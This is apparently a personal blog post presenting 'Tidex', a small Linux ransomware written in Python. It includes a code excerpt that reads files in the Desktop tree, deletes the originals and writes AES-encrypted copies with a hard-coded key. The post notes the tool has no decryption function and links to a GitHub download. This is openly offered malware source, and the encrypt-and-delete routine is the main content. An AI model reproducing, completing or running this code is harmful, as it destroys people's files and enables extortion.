---
title: "[🇺🇸] Tidex Ransomware"
excerpt: "Ransomware Example Tidex for Linux"
date: "Jan 30 2023"
cover_image: "/blog/rtidex.webp"
alt: "Ransomware"
tags1: "Python"
tags2: "Hacking"
---

# Tidex

Simple little Ransomware, only works to encrypt files in the directory path Desktop and subdirectories.

&nbsp;

## Important

At the moment it can only be executed on Linux machines. it lacks decryption function.
The KEY is: **hkpykiiqftupr3okl04azj**

&nbsp;

Code Example

```python
def _lock():
    for files in all_Ext:
        for _dotFile in glob.glob(files):
            print(_dotFile)
            f = open(f'{__dir()}/{_dotFile}', 'rb')
            dataArr = f.read()
            f.close()
            os.remove(f'{__dir()}/{_dotFile}')
            key = "hkpykiiqftupr3okl04azj"
            aes = pyaes.AESModeOfOperationCTR(key)
            EncryptData = aes.encrypt(dataArr)
            newArr = _dotFile.replace(char, "") + Ext
            newArr = open(f'{newArr}', 'wb')
            newArr.write(EncryptData)
            newArr.close()
```

### [Dowload Here From GitHub](https://github.com/Rawierdt/Tidex)

Thx
~ Rawier.
